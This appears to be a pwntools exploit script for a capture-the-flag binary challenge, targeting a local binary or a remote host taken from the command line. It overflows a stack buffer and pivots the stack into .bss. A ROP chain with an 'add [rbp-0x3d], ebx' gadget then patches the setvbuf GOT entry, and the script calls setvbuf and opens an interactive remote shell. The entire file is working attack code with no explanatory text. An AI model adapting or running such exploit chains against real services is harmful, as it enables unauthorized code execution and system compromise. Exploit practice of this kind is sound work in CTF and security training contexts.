import IPython
from pwn import *

context.log_level = "INFO"


def st():
  if args.REMOTE:
    return remote(sys.argv[1], sys.argv[2])

  return process(exe)


exe = "../public/chall_patched"
elf = context.binary = ELF(exe)

MAGIC_WORD = 0xdeadbeefcafebabe

#0x000000000040113c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
add_rbp_0x3d_ebx_ret = 0x40113c

#0x00000000004011ed : mov eax, 0 ; leave ; ret
mov_eax_0_leave_ret = 0x4011ed

#0x000000000040113d : pop rbp ; ret
pop_rbp_ret = 0x40113d

#0x00000000004011f2 : leave ; ret
leave_ret = 0x4011f2

ret = leave_ret + 1

bss = 0x404000
rw_area = bss + 0xc0

io = st()
if __name__ == "__main__":
  payload = b"A" * 0x10 + p64(rw_area + 0x800) + p64(elf.sym['main'] + 28)
  io.sendline(payload)

  payload = b"A" * 0x10 + p64(rw_area + 0x700) + p64(elf.sym['main'] + 28)
  io.sendline(payload)


  rbp = elf.got['setvbuf'] + 0x3d
  rbx = -0x2be57
  r12 = 0
  r13 = 0
  r14 = 0
  r15 = 0
  rip = add_rbp_0x3d_ebx_ret
  payload = flat({8: rbx, 16: r12, 24: r13, 32: r14, 40: r15, 48: rbp, 56: rip})
  payload += p64(pop_rbp_ret) + \
               p64(bss + 0xc00) + \
               p64(leave_ret) + \
               b"A" * (0xc00 - 0x808) + \
               p64(bss + 0xb00) + \
               p64(elf.sym['main'] + 28)
  io.sendline(payload)


  #rsp = 0x404b28
  rbp = bss + 0xb28
  rbx = 0
  r12 = 0
  r13 = 0
  r14 = 0
  r15 = 0
  rip = mov_eax_0_leave_ret
  payload = flat({8: rbx, 16: r12, 24: r13, 32: r14, 40: r15, 48: rbp, 56: rip}) +\
            p64(ret) +\
            p64(elf.sym['setvbuf'])

  io.sendline(payload)


  log.success("Popping shell...")
  io.interactive()

  IPython.embed()
  io.close()
